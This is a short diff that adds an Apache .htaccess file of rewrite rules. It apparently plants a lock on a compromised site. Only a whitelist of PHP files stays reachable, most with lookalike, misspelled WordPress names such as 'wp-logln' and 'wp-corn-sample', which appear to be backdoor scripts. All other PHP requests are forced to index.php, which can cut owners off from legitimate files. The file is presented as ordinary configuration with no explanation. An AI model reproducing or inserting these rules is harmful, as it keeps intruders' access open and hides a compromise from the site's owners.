@@ -1,0 +1,9 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^(index|wp\-admin|wp\-include|wp\-comment|wp\-loader|wp\-corn\-sample|wp\-logln|output|about|admin|wp\-ver).php$ - [L]
+RewriteRule ^.*\.php index.php [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
